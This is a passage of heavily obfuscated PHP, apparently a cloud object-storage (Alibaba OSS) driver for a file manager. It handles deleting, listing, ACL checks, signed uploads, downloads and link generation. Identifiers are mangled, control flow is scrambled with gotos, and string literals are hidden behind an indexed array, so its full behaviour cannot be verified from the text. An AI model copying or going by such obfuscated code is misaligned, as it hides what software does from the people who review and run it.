$this->pathEncode($f‰ÙÏ‹µä²), $b‹¬ñÌìä, $Bª¯´Óµ²é, $B“ö½ªÄ›); $b‹¬ñÌìä = $b‹¬ñÌìä + 1; } goto BŞºÑºŸ; bï„îöÆÆ: } catch (OSS\Core\OssException $e…½Ì¨Çø») { return !1; } return !0; } public function moveFile($fê³°ÂÒ, $FÈ·Ó‡Û¶©) { if ($this->copyFile($fê³°ÂÒ, $FÈ·Ó‡Û¶©)) { $this->remove($fê³°ÂÒ); return $this->getPathOuter($FÈ·Ó‡Û¶©); } return !1; } public function delFile($EéˆëäéˆÌ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($EéˆëäéˆÌ)); } catch (OSS\Core\OssException $cÏƒˆ•éÉÙ) { return !1; } return !0; } public function delFolder($D´˜¨‡Ì‚) { goto c¸ğÉÙ§¶; c¸ğÉÙ§¶: $aéÈÚ—³´Å =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->exist($D´˜¨‡Ì‚)) { return !0; } $this->listItemCache = !1; goto féóğİÌÆù; aÒ¿ğòô¸Å: if (!empty($D´˜¨‡Ì‚) && !in_array($EŒÍ¢íÂ, $C“‚‹ÍÖ¦[$aéÈÚ—³´Å[74]])) { $C“‚‹ÍÖ¦[$aéÈÚ—³´Å[74]][] = $EŒÍ¢íÂ; } $E÷•ìï·Ş = $this->delByBatch($C“‚‹ÍÖ¦[$aéÈÚ—³´Å[73]]); if (!$E÷•ìï·Ş) { return !1; } goto f§‚§Äİ‚; féóğİÌÆù: $C“‚‹ÍÖ¦ = $this->fileList($D´˜¨‡Ì‚); $this->listItemCache = !0; $EŒÍ¢íÂ = trim($D´˜¨‡Ì‚, $aéÈÚ—³´Å[8]) . $aéÈÚ—³´Å[8]; goto aÒ¿ğòô¸Å; f§‚§Äİ‚: return $this->delByBatch($C“‚‹ÍÖ¦[$aéÈÚ—³´Å[74]]); goto A²¥šÊ¤êğ; A²¥šÊ¤êğ: } private function delByBatch($fäãÁà…èÜ) { foreach (array_chunk($fäãÁà…èÜ, 1000) as $b…ğÄĞ«¥) { try { $this->client->deleteObjects($this->bucket, $b…ğÄĞ«¥); } catch (OSS\Core\OssException $a ÂŒË¦›) { return !1; } } return !0; } public function rename($Cª¹»…äÀ , $CõÂÈ¾™ÂÑ) { return $this->renameObject($Cª¹»…äÀ , $CõÂÈ¾™ÂÑ); } private function fileInfo($Aª¤›’¢–Å, $FÒç¿³õš = false, $fÄà ÖÀÙ = array()) { goto E¬ê–Ø®Á; AÂíñ—ŠÉš: $D¨«æ‚ÕÅ[$câˆ‰šÄ[200]] = $D¨«æ‚ÕÅ[$câˆ‰šÄ[107]] = 0; $D¨«æ‚ÕÅ[$câˆ‰šÄ[201]] = $D¨«æ‚ÕÅ[$câˆ‰šÄ[202]] = !0; if (empty($fÄà ÖÀÙ)) { $DŠÙ„ß®³† = $this->objectMeta($Aª¤›’¢–Å); if (!$DŠÙ„ß®³†) { return $D¨«æ‚ÕÅ; } $fÄà ÖÀÙ = array($câˆ‰šÄ[107] => strtotime($DŠÙ„ß®³†[$câˆ‰šÄ[1212]]), $câˆ‰šÄ[77] => $DŠÙ„ß®³†[$câˆ‰šÄ[1211]] + 0); } goto cè ¥†Á˜à; cè ¥†Á˜à: if (isset($fÄà ÖÀÙ[$câˆ‰šÄ[77]])) { $D¨«æ‚ÕÅ[$câˆ‰šÄ[77]] = $fÄà ÖÀÙ[$câˆ‰šÄ[77]]; } if (isset($fÄà ÖÀÙ[$câˆ‰šÄ[107]])) { $D¨«æ‚ÕÅ[$câˆ‰šÄ[107]] = $fÄà ÖÀÙ[$câˆ‰šÄ[107]]; } if (isset($fÄà ÖÀÙ[$câˆ‰šÄ[203]]) && !trim($D¨«æ‚ÕÅ[$câˆ‰šÄ[107]])) { $D¨«æ‚ÕÅ[$câˆ‰šÄ[107]] = $fÄà ÖÀÙ[$câˆ‰šÄ[203]]; } goto DùøæìÇ; E¬ê–Ø®Á: $câˆ‰šÄ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¨«æ‚ÕÅ = array($câˆ‰šÄ[28] => $this->pathThis($Aª¤›’¢–Å), $câˆ‰šÄ[75] => $this->getPathOuter($Aª¤›’¢–Å), $câˆ‰šÄ[29] => $câˆ‰šÄ[171], $câˆ‰šÄ[77] => isset($fÄà ÖÀÙ[$câˆ‰šÄ[77]]) ? $fÄà ÖÀÙ[$câˆ‰šÄ[77]] : 0, $câˆ‰šÄ[165] => $this->ext($Aª¤›’¢–Å)); if ($FÒç¿³õš) { return $D¨«æ‚ÕÅ; } goto AÂíñ—ŠÉš; DùøæìÇ: return $D¨«æ‚ÕÅ; goto fÏğôÏ’ìÏ; fÏğôÏ’ìÏ: } private function folderInfo($a­àˆ‰’éÏ, $D²¡à§¥è‹ = false, $CêÌÊ¡šŒ = array()) { goto AÔ–ùİ³«Ÿ; FÁˆˆàŠÔß: if (isset($CêÌÊ¡šŒ[$AË¾á²ÕŸÚ[107]])) { $EÇ¼ñåÃß[$AË¾á²ÕŸÚ[107]] = $CêÌÊ¡šŒ[$AË¾á²ÕŸÚ[107]]; } if (isset($CêÌÊ¡šŒ[$AË¾á²ÕŸÚ[200]])) { $EÇ¼ñåÃß[$AË¾á²ÕŸÚ[200]] = $CêÌÊ¡šŒ[$AË¾á²ÕŸÚ[200]]; } return $EÇ¼ñåÃß; goto dá‡òß‹ğ; d¶†óÔÁä: $EÇ¼ñåÃß[$AË¾á²ÕŸÚ[200]] = $EÇ¼ñåÃß[$AË¾á²ÕŸÚ[107]] = 0; $EÇ¼ñåÃß[$AË¾á²ÕŸÚ[201]] = $EÇ¼ñåÃß[$AË¾á²ÕŸÚ[202]] = !0; if (empty($CêÌÊ¡šŒ)) { $a­àˆ‰’éÏ = rtrim($a­àˆ‰’éÏ, $AË¾á²ÕŸÚ[8]) . $AË¾á²ÕŸÚ[8]; $E­‘™ºÌ¥œ = $this->objectMeta($a­àˆ‰’éÏ); if (!$E­‘™ºÌ¥œ) { return $EÇ¼ñåÃß; } $CêÌÊ¡šŒ = array($AË¾á²ÕŸÚ[200] => $E­‘™ºÌ¥œ[$AË¾á²ÕŸÚ[1219]][$AË¾á²ÕŸÚ[1220]], $AË¾á²ÕŸÚ[107] => strtotime($E­‘™ºÌ¥œ[$AË¾á²ÕŸÚ[1212]])); } goto FÁˆˆàŠÔß; AÔ–ùİ³«Ÿ: $AË¾á²ÕŸÚ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÇ¼ñåÃß = array($AË¾á²ÕŸÚ[28] => $this->pathThis($a­àˆ‰’éÏ), $AË¾á²ÕŸÚ[75] => $this->getPathOuter($AË¾á²ÕŸÚ[8] . $a­àˆ‰’éÏ), $AË¾á²ÕŸÚ[29] => $AË¾á²ÕŸÚ[76]); if ($D²¡à§¥è‹) { return $EÇ¼ñåÃß; } goto d¶†óÔÁä; dá‡òß‹ğ: } public function listPath($cŒë‚î°â, $FùŒáà…Ö = false) { $BİôËò‰ó =& $_SERVER[åÌÛ»ô¢‚ö™]; $C”ˆãó©ä = $this->fileList($cŒë‚î°â, $BİôËò‰ó[8], !0); foreach ($C”ˆãó©ä[$BİôËò‰ó[74]] as $AáÃ¦Âùå => $FÍ È¶Î’ó) { $C”ˆãó©ä[$BİôËò‰ó[74]][$AáÃ¦Âùå] = $this->folderInfo($FÍ È¶Î’ó, $FùŒáà…Ö, $FÍ È¶Î’ó); } foreach ($C”ˆãó©ä[$BİôËò‰ó[73]] as $AáÃ¦Âùå => $FÍ È¶Î’ó) { $C”ˆãó©ä[$BİôËò‰ó[73]][$AáÃ¦Âùå] = $this->fileInfo($FÍ È¶Î’ó[$BİôËò‰ó[28]], $FùŒáà…Ö, $FÍ È¶Î’ó); } return $C”ˆãó©ä; } public function has($bá¨ÍÒÌÌ¨, $cÌæ¸”Ïå = false, $eİöÂßÕÀ‹ = true) { goto AÊ÷“â²¾ƒ; AÊ÷“â²¾ƒ: $CŠœ˜Æ¦Š« =& $_SERVER[åÌÛ»ô¢‚ö™]; $bá¨ÍÒÌÌ¨ = trim($bá¨ÍÒÌÌ¨, $CŠœ˜Æ¦Š«[8]); $A·¯™°Œæ– = empty($bá¨ÍÒÌÌ¨) ? $CŠœ˜Æ¦Š«[33] : $bá¨ÍÒÌÌ¨ . $CŠœ˜Æ¦Š«[8]; goto e”íš”ÏÊÆ; e”íš”ÏÊÆ: $Bæ‡¡šˆí = $CŠœ˜Æ¦Š«[33]; $F‹‡ª”ŒŞ– = 500; $A¦îá“«æ¡ = $fÏ…ÆóØ… = 0; goto a —í¶¹¶Ğ; a —í¶¹¶Ğ: while (!0) { check_abort(); $e²¡ÅšæëÑ = array($CŠœ˜Æ¦Š«[1207] => $CŠœ˜Æ¦Š«[8], $CŠœ˜Æ¦Š«[1208] => $A·¯™°Œæ–, $CŠœ˜Æ¦Š«[1209] => $F‹‡ª”ŒŞ–, $CŠœ˜Æ¦Š«[1210] => $Bæ‡¡šˆí); try { $Eç­ìéôì = $this->client->listObjects($this->bucket, $e²¡ÅšæëÑ); } catch (OSS\Core\OssException $FïŞÉöŒ) { break; } $Bæ‡¡šˆí = $Eç­ìéôì->getNextMarker(); $eÌÎ‚Íï = $Eç­ìéôì->getObjectList(); $e–àà»à­ˆ = $Eç­ìéôì->getPrefixList(); if ($cÌæ¸”Ïå) { if (count($eÌÎ‚Íï) > 1 || count($eÌÎ‚Íï) == 1 && $eÌÎ‚Íï[0]->getKey() != $A·¯™°Œæ–) { $A¦îá“«æ¡ += count($eÌÎ‚Íï) - 1; } if (!empty($e–àà»à­ˆ)) { $fÏ…ÆóØ… += count($e–àà»à­ˆ); } if ($Bæ‡¡šˆí === $CŠœ˜Æ¦Š«[33]) { break; } continue; } if ($eİöÂßÕÀ‹) { if (!empty($eÌÎ‚Íï)) { if (count($eÌÎ‚Íï) > 1 || $eÌÎ‚Íï[0]->getKey() != $A·¯™°Œæ–) { return !0; } } } else { if (!empty($e–àà»à­ˆ)) { return !0; } } if ($Bæ‡¡šˆí === $CŠœ˜Æ¦Š«[33]) { break; } } if ($cÌæ¸”Ïå) { return array($CŠœ˜Æ¦Š«[209] => $A¦îá“«æ¡, $CŠœ˜Æ¦Š«[210] => $fÏ…ÆóØ…); } return !1; goto b¯äŒ±¾•£; b¯äŒ±¾•£: } public function listAll($c„´ö•Î†) { $FÊ†êÉé =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÀòõ •ÂÒ = $this->fileList($c„´ö•Î†, $FÊ†êÉé[33], !0); $E‡ÜÓàÀËç = array(); foreach ($FÀòõ •ÂÒ[$FÊ†êÉé[73]] as $cõ÷¢‡¢—›) { $E‡ÜÓàÀËç[$cõ÷¢‡¢—›[$FÊ†êÉé[28]]] = $cõ÷¢‡¢—›[$FÊ†êÉé[77]]; } foreach ($FÀòõ •ÂÒ[$FÊ†êÉé[74]] as $cõ÷¢‡¢—›) { if (is_string($cõ÷¢‡¢—›)) { $E‡ÜÓàÀËç[$cõ÷¢‡¢—›] = 0; } } return $this->listAllFiles($c„´ö•Î†, array_keys($E‡ÜÓàÀËç), $E‡ÜÓàÀËç); } public function canRead($D¬„„„Õ°µ) { $f’„ ¯¤éø =& $_SERVER[åÌÛ»ô¢‚ö™]; $b´šŠö£ËŒ = $this->pathAcl($D¬„„„Õ°µ); return $b´šŠö£ËŒ == $f’„ ¯¤éø[1221] || $b´šŠö£ËŒ == $f’„ ¯¤éø[517] ? !0 : !1; } public function canWrite($bØÃ÷ †¯ ) { $bÊ‹¬‡¨ÃÏ = $this->pathAcl($bØÃ÷ †¯ ); return $bÊ‹¬‡¨ÃÏ == $_SERVER[åÌÛ»ô¢‚ö™][517] ? !0 : !1; } public function pathAcl($eÆ¼ŠêÄ”) { goto dôôœËÖ¾¿; dôôœËÖ¾¿: $b÷Ÿ÷ğ‹… =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $B‘åí‡–œ¦ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($eÆ¼ŠêÄ”)); } catch (OSS\Core\OssException $f‚‚ĞĞçÏŒ) { return !1; } goto B³’¹­Üè; F¢Û¥ƒ¯ÓÔ: return $aíµ­ÁÕ¶; goto bÑÜ£—‚ˆÁ; B³’¹­Üè: $aíµ­ÁÕ¶ = $B‘åí‡–œ¦ == $b÷Ÿ÷ğ‹…[34] ? $this->bucketAcl : $B‘åí‡–œ¦; if ($aíµ­ÁÕ¶ == $b÷Ÿ÷ğ‹…[1222]) { return $b÷Ÿ÷ğ‹…[1221]; } if ($aíµ­ÁÕ¶ == $b÷Ÿ÷ğ‹…[1223]) { return $b÷Ÿ÷ğ‹…[517]; } goto F¢Û¥ƒ¯ÓÔ; bÑÜ£—‚ˆÁ: } private function chmodPath($Fğ»·‹íëÓ, $b¨‚šÃªî = '') { $fÒš·ˆÀÔ° =& $_SERVER[åÌÛ»ô¢‚ö™]; $fêÎ™ÉÂàÈ = empty($b¨‚šÃªî) ? $fÒš·ˆÀÔ°[1223] : $b¨‚šÃªî; $A‰‚–÷Ş‘Ó = array($fÒš·ˆÀÔ°[34], $fÒš·ˆÀÔ°[199], $fÒš·ˆÀÔ°[1222], $fÒš·ˆÀÔ°[1223]); if (!in_array($fêÎ™ÉÂàÈ, $A‰‚–÷Ş‘Ó)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Fğ»·‹íëÓ), $fêÎ™ÉÂàÈ); } catch (OSS\Core\OssException $F™´Æèõ³ö) { return !1; } return !0; } public function getContent($dõÍ¾ÂÈíÛ) { return $this->fileSubstr($dõÍ¾ÂÈíÛ, -1); } public function setContent($c“··•æÜ, $CÈå…Ëäà” = '') { $FƒäÍ¼ÏŞ¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; try { $BÖïñÜ¯‘ = $this->trafficLimit($FƒäÍ¼ÏŞ¥[1224]); $F‡ï¸ÈÒˆè = $this->client->putObject($this->bucket, $this->pathEncode($c“··•æÜ), $CÈå…Ëäà”, $BÖïñÜ¯‘); } catch (OSS\Core\OssException $cŞ…Äé„ƒø) { return !1; } $f´§ˆ–ñõ­ = array($FƒäÍ¼ÏŞ¥[1213] => trim($F‡ï¸ÈÒˆè[$FƒäÍ¼ÏŞ¥[1225]], $FƒäÍ¼ÏŞ¥[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($c“··•æÜ))); $this->updateObjMeta($c“··•æÜ, $f´§ˆ–ñõ­); return isset($F‡ï¸ÈÒˆè[$FƒäÍ¼ÏŞ¥[1226]][$FƒäÍ¼ÏŞ¥[1172]]) ? (int) $F‡ï¸ÈÒˆè[$FƒäÍ¼ÏŞ¥[1226]][$FƒäÍ¼ÏŞ¥[1172]] : strlen($F‡ï¸ÈÒˆè); } private function updateObjMeta($eÍßÃâšÔ, $b¼‚Õ¿˜ºğ) { $eÍßÃâšÔ = $this->pathEncode($eÍßÃâšÔ); try { $E’É¾´ˆ¹· = array(OSS\OssClient::OSS_HEADERS => $b¼‚Õ¿˜ºğ); $this->client->copyObject($this->bucket, $eÍßÃâšÔ, $this->bucket, $eÍßÃâšÔ, $E’É¾´ˆ¹·); } catch (OSS\Core\OssException $AœƒãœÔ×) { return !1; } return !0; } public function upload($DˆœİÊ®¶÷, $CÆ²Ü‘, $bŠ‚–ä Ë = false, $C‚¤¼ò¨½ = REPEAT_REPLACE) { $E‚ŒºÀØØÆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÊåÌŒØ» = trim($DˆœİÊ®¶÷, $E‚ŒºÀØØÆ[8]); $CøŠª‚À‰Ã = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($E‚ŒºÀØØÆ[1213] => @md5_file($CÆ²Ü‘)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($DˆœİÊ®¶÷))); $CøŠª‚À‰Ã = $this->trafficLimit($E‚ŒºÀØØÆ[1224], $CøŠª‚À‰Ã); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($DÊåÌŒØ»), $CÆ²Ü‘, $CøŠª‚À‰Ã); } catch (OSS\Core\OssException $Fì‚ô©‚Í”) { return !1; } return $this->getPathOuter($DˆœİÊ®¶÷); } public function getHost() { $bµŠˆ—ê†Ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÁèØ¬ô• = explode($bµŠˆ—ê†Ô[175], parent::getHost()); return $fÁèØ¬ô•[0] . $bµŠˆ—ê†Ô[175] . $this->bucket . $bµŠˆ—ê†Ô[91] . $fÁèØ¬ô•[1]; } public function uploadFormData($B™çïîØ­•, $c¹øÂ‚˜ø = 3600) { goto e‹ìĞÌÛ’˜; BÖçö† â: $CÂãä˜£á = date($Cªª¼ºÄ£˜[1227], time() + $EÜ¸»ÜàŸ®); $Fæ–è››“‘ = new DateTime($CÂãä˜£á); $D•´ê‘Ï™‰ = $Fæ–è››“‘->format(DateTime::ISO8601); goto eé–Ë‰À†í; EÆ¤ İÉ¢´: $BÉ²œŞÂÆá = base64_encode(hash_hmac($Cªª¼ºÄ£˜[235], $bò‡¯ÇÖø , $this->secret, !0)); $DØ¤ÑŒ²³ = array($Cªª¼ºÄ£˜[1138] => $bò‡¯ÇÖø , $Cªª¼ºÄ£˜[1230] => $this->accessKey, $Cªª¼ºÄ£˜[1134] => $Cªª¼ºÄ£˜[1126], $Cªª¼ºÄ£˜[1231] => $BÉ²œŞÂÆá, $Cªª¼ºÄ£˜[173] => $bå„©ùí®¢); $DØ¤ÑŒ²³ = $this->trafficLimit($Cªª¼ºÄ£˜[1224], $DØ¤ÑŒ²³); goto CØšœà¬; a±ÚïÛ«®²: $EˆÂ¨Çà¡Æ = $this->pathFather($B™çïîØ­•); $D±Ï˜›¢ÀÁ = array($Cªª¼ºÄ£˜[1128] => $D•´ê‘Ï™‰, $Cªª¼ºÄ£˜[1129] => array(array($Cªª¼ºÄ£˜[1229], 0, $BÁ£Ïé¤ØÊ), array($Cªª¼ºÄ£˜[1132], $Cªª¼ºÄ£˜[1133], $EˆÂ¨Çà¡Æ))); $bò‡¯ÇÖø  = base64_encode(json_encode($D±Ï˜›¢ÀÁ)); goto EÆ¤ İÉ¢´; e‹ìĞÌÛ’˜: $Cªª¼ºÄ£˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!($bå„©ùí®¢ = $this->getHost())) { return !1; } $EÜ¸»ÜàŸ® = $c¹øÂ‚˜ø; goto BÖçö† â; eé–Ë‰À†í: $BìÄ¬ƒ²ÆÙ = strpos($D•´ê‘Ï™‰, $Cªª¼ºÄ£˜[299]); $D•´ê‘Ï™‰ = substr($D•´ê‘Ï™‰, 0, $BìÄ¬ƒ²ÆÙ) . $Cªª¼ºÄ£˜[1228]; $BÁ£Ïé¤ØÊ = 1048576000 * 5; goto a±ÚïÛ«®²; CØšœà¬: return $DØ¤ÑŒ²³; goto EôË¦š¨Šñ; EôË¦š¨Šñ: } public function multiUploadFormData($B„Éî”¥İ¸, $E»ÇËò­Ü = 3600) { $b“¤¿˜³°ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!($açŠ¸Ëà°¾ = $this->getHost())) { return !1; } $BÒ…‘‚Ù = $this->trafficLimit($b“¤¿˜³°ƒ[1224]); $AİÉæË ô = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B„Éî”¥İ¸), $BÒ…‘‚Ù); return array($b“¤¿˜³°ƒ[227] => $AİÉæË ô, $b“¤¿˜³°ƒ[173] => $açŠ¸Ëà°¾ . $b“¤¿˜³°ƒ[8] . $this->pathEncode($B„Éî”¥İ¸), $b“¤¿˜³°ƒ[228] => gmdate($b“¤¿˜³°ƒ[1232]), $b“¤¿˜³°ƒ[89] => $B„Éî”¥İ¸); } public function multiUploadAuthData($dÚÇâ®¢Æ, $FÑĞŸ¡ÒÚå = array()) { goto d´¹¥µ‚õÜ; F°Ûš¼ğ®Á: $A·ß¾Ìí„¥ = $dÚÇâ®¢Æ; if (isset($FÑĞŸ¡ÒÚå[$EóËôŞç†[89]])) { $A·ß¾Ìí„¥ = $FÑĞŸ¡ÒÚå[$EóËôŞç†[89]]; unset($FÑĞŸ¡ÒÚå[$EóËôŞç†[89]]); } if (isset($FÑĞŸ¡ÒÚå[$EóËôŞç†[229]])) { $FÑĞŸ¡ÒÚå[$EóËôŞç†[228]] = $Eô–†ÉåÄ; return $this->listUploadParts($A·ß¾Ìí„¥, $FÑĞŸ¡ÒÚå); } goto aÄÉ‚ÁßÓ’; B°ãÆÑæ×: if (!empty($FÑĞŸ¡ÒÚå[$EóËôŞç†[1234]])) { $böŸßÂÈİÕ = array_merge(array($Bëí×‚§âÌ[4]), $FÑĞŸ¡ÒÚå[$EóËôŞç†[1234]]); sort($böŸßÂÈİÕ); $Bëí×‚§âÌ[4] = implode($EóËôŞç†[183], $böŸßÂÈİÕ); } $D± °­Äñ‰ = implode($EóËôŞç†[183], $Bëí×‚§âÌ); $E–æ¸ÔÔï¡ = base64_encode(hash_hmac($EóËôŞç†[235], $D± °­Äñ‰, $this->secret, !0)); goto a„ÅØ‰¾ìØ; aÄÉ‚ÁßÓ’: $Bëí×‚§âÌ = array($EóËôŞç†[230], $EóËôŞç†[33], $EóËôŞç†[116], $Eô–†ÉåÄ, "\x78\x2d\x6f\x73\163\x2d\144\141\x74\145\72{$Eô–†ÉåÄ}", $EóËôŞç†[8] . $this->bucket . $EóËôŞç†[8] . $A·ß¾Ìí„¥ . $eÏÃÀêƒ— ); if (strpos($eÏÃÀêƒ— , $EóËôŞç†[231]) === 0) { $Bëí×‚§âÌ[0] = $EóËôŞç†[232]; if ($Cˆ·‘²æ”” = $this->trafficLimit($EóËôŞç†[1224])) { $A·ß¾Ìí„¥ = $EóËôŞç†[1233]; array_splice($Bëí×‚§âÌ, 5, 0, $A·ß¾Ìí„¥ . $EóËôŞç†[4] . $Cˆ·‘²æ””[$A·ß¾Ìí„¥]); } } if (isset($FÑĞŸ¡ÒÚå[$EóËôŞç†[233]]) && $FÑĞŸ¡ÒÚå[$EóËôŞç†[233]] == $EóËôŞç†[234]) { $Bëí×‚§âÌ[0] = $EóËôŞç†[234]; } goto B°ãÆÑæ×; d´¹¥µ‚õÜ: $EóËôŞç† =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eô–†ÉåÄ = isset($FÑĞŸ¡ÒÚå[$EóËôŞç†[228]]) ? $FÑĞŸ¡ÒÚå[$EóËôŞç†[228]] : gmdate($EóËôŞç†[1232]); $eÏÃÀêƒ—  = isset($FÑĞŸ¡ÒÚå[$EóËôŞç†[165]]) ? $FÑĞŸ¡ÒÚå[$EóËôŞç†[165]] : $EóËôŞç†[33]; goto F°Ûš¼ğ®Á; a„ÅØ‰¾ìØ: $D“‡±œó’¾ = $EóËôŞç†[1197] . $this->accessKey . $EóËôŞç†[4] . $E–æ¸ÔÔï¡; if (strpos($eÏÃÀêƒ— , $EóËôŞç†[231]) === 0) { $D“‡±œó’¾ = array($EóËôŞç†[237] => $D“‡±œó’¾, $EóËôŞç†[228] => $Eô–†ÉåÄ); if ($Cˆ·‘²æ””) { $D“‡±œó’¾ = array_merge($D“‡±œó’¾, $Cˆ·‘²æ””); } } return $D“‡±œó’¾; goto bš‹÷óéö; bš‹÷óéö: } public function listUploadParts($FÍ‰ğšÅÁ, $FÕùá¶„‘¥) { goto B”‰øÓ‘³ó; d«óçò¸…³: unset($FÕùá¶„‘¥[$aæäŞ÷Ä÷Š[229]], $FÕùá¶„‘¥[$aæäŞ÷Ä÷Š[233]]); $Cš¢Ò©¼ù  = $this->multiUploadAuthData($FÍ‰ğšÅÁ, $FÕùá¶„‘¥); if (empty($Cš¢Ò©¼ù )) { return !1; } goto CéÎ‰ÚäŞò; B”‰øÓ‘³ó: $aæäŞ÷Ä÷Š =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¤ï•Ô½«– = parse_url_query($FÕùá¶„‘¥[$aæäŞ÷Ä÷Š[165]]); $FÜÄò£øŒ = $this->client->listParts($this->bucket, $this->pathEncode($FÍ‰ğšÅÁ), $D¤ï•Ô½«–[$aæäŞ÷Ä÷Š[227]]); goto A‚½ÚÄğë; CéÎ‰ÚäŞò: return array($aæäŞ÷Ä÷Š[237] => $Cš¢Ò©¼ù , $aæäŞ÷Ä÷Š[228] => $FÕùá¶„‘¥[$aæäŞ÷Ä÷Š[228]], $aæäŞ÷Ä÷Š[239] => $c»¡‡¨ôÑì); goto EŞ”Ÿí¥Ó†; A‚½ÚÄğë: $aÄ†ß¹šèÀ = $FÜÄò£øŒ->getListPart(); $c»¡‡¨ôÑì = array(); foreach ($aÄ†ß¹šèÀ as $a†‹‘¾©â‚) { $c»¡‡¨ôÑì[] = array($aæäŞ÷Ä÷Š[1217] => $a†‹‘¾©â‚->getPartNumber(), $aæäŞ÷Ä÷Š[1218] => trim($a†‹‘¾©â‚->getETag(), $aæäŞ÷Ä÷Š[113])); } goto d«óçò¸…³; EŞ”Ÿí¥Ó†: } public function download($d‰ÃìÏùàˆ, $bŞëà±­òø) { if ($this->isFolder($d‰ÃìÏùàˆ)) { return !1; } try { $cìÌ†ÜÄ„¿ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $bŞëà±­òø); $cìÌ†ÜÄ„¿ = $this->trafficLimit($_SERVER[åÌÛ»ô¢‚ö™][105], $cìÌ†ÜÄ„¿); $this->client->getObject($this->bucket, $this->pathEncode($d‰ÃìÏùàˆ), $cìÌ†ÜÄ„¿); } catch (OSS\Core\OssException $CİŸÖ§ÔÖ”) { return !1; } return $bŞëà±­òø; } public function fileSubstr($dš¢Úˆ‚èñ, $a–êååÜÃß = 0, $cİóñŸØª” = false) { if ($a–êååÜÃß === -1) { $eÓšè’½¸ = array(); } else { if ($cİóñŸØª” === !1) { $Aº­÷¶æ¾ = $this->size($dš¢Úˆ‚èñ); } else { $Aº­÷¶æ¾ = $a–êååÜÃß + $cİóñŸØª” - 1; } $eÓšè’½¸ = array(OSS\OssClient::OSS_RANGE => "{$a–êååÜÃß}\x2d{$Aº­÷¶æ¾}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($dš¢Úˆ‚èñ), $eÓšè’½¸); } catch (OSS\Core\OssException $E½ÑëÎÂğÂ) { think_exception($E½ÑëÎÂğÂ->getMessage()); return !1; } } private function trafficLimit($då¼‡ÊàŠ, $b•œÃÕ„à = array()) { goto c±÷ÁùĞ; c±÷ÁùĞ: $e±ÃÂœøâ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($då¼‡ÊàŠ == $e±ÃÂœøâ[1224] && $this->isUploadServer() || $då¼‡ÊàŠ == $e±ÃÂœøâ[105] && $this->isFileOutServer()) { return $b•œÃÕ„à; } $d…’ãò²å = floatval($GLOBALS[$e±ÃÂœøâ[6]][$e±ÃÂœøâ[84]][$e±ÃÂœøâ[103]][$då¼‡ÊàŠ]) * 1024 * 1024 * 8; goto CîÖ‰»™Ê‡; dáğÖŒØ‘é: return $b•œÃÕ„à; goto bÚŞ‹©¢Ó²; CîÖ‰»™Ê‡: if (!$d…’ãò²å) { return $b•œÃÕ„à; } $d…’ãò²å = $d…’ãò²å < 819200 ? 819200 : ($d…’ãò²å > 838860800 ? 838860800 : $d…’ãò²å); $b•œÃÕ„à[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($d…’ãò²å); goto dáğÖŒØ‘é; bÚŞ‹©¢Ó²: } public function link($Dô¹ºöºî, $CÈõëæòñš = array()) { $f¸ÕÕ›«êŞ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->exist($Dô¹ºöºî) || $this->isFolder($Dô¹ºöºî)) { return !1; } try { $CÈõëæòñš = $this->trafficLimit($f¸ÕÕ›«êŞ[105], $CÈõëæòñš); $E†éÜÛŸ¯ = $this->client->signUrl($this->bucket, $this->pathEncode($Dô¹ºöºî), 3600 * 12, $f¸ÕÕ›«êŞ[234], $CÈõëæòñš); return $this->getCdnLink($E†éÜÛŸ¯); } catch (OSS\Core\OssException $B¾½ïÚ®ëÁ) { return !1; } } public function fileOut($fèÇù¾âŞ, $a„Ï´Íëù¡ = false, $c¶‡—«È­ = false, $b”Ùö™¯˜Ù = '') { goto A®—™«­Äš; fß†É¾¿èã: $d”Ê¢Ô˜ = $this->link($fèÇù¾âŞ, $BìĞ¼¶Ü ); $this->fileOutLink($d”Ê¢Ô˜); goto f§õå—ÆË; fë‰‹ãƒµË: $a„Ï´Íëù¡ = $a„Ï´Íëù¡ ? $e¡ÌÕš­§[220] : $e¡ÌÕš­§[221]; $BìĞ¼¶Ü  = array(OSS\OssClient::OSS_SUB_RESOURCE => $e¡ÌÕš­§[1235] . rawurlencode("{$a„Ï´Íëù¡}\73\x66\x69\154\145\156\x61\x6d\x65\x3d{$c¶‡—«È­}")); $BìĞ¼¶Ü [OSS\OssClient::OSS_SUB_RESOURCE] .= $e¡ÌÕš­§[1236] . rawurlencode($dÔ×Ø–¢· ); goto fß†É¾¿èã; a¡‡£é‹ÌÊ: $c¶‡—«È­ = rawurlencode($c¶‡—«È­); $dÔ×Ø–¢·  = get_file_mime(get_path_ext($c¶‡—«È­)); if ($dÔ×Ø–¢·  == $e¡ÌÕš­§[219]) { return parent::fileOut($fèÇù¾âŞ, $a„Ï´Íëù¡, $c¶‡—«È­, $b”Ùö™¯˜Ù); } goto fë‰‹ãƒµË; A®—™«­Äš: $e¡ÌÕš­§ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->isFileOutServer()) { return $this->fileOutServer($fèÇù¾âŞ, $a„Ï´Íëù¡, $c¶‡—«È­, 